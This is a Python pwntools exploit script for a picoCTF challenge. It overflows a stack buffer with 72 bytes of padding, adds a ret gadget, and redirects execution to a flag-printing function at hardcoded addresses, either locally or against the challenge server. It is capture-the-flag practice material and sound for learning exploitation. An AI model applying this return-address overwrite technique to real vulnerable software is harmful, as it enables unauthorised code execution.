#!/usr/bin/env python3

from pwn import *

HOST = "saturn.picoctf.net"
PORT = 64947

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'warn'

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()
    ret = 0x040101a
    flag = 0x0401236
    rip_offset = 72
    # good luck pwning :)
    payload = b'A' * 72
    payload += p64(ret)
    payload += p64(flag)
    r.sendlineafter('flag:', payload)
    r.interactive()


if __name__ == "__main__":
    main()

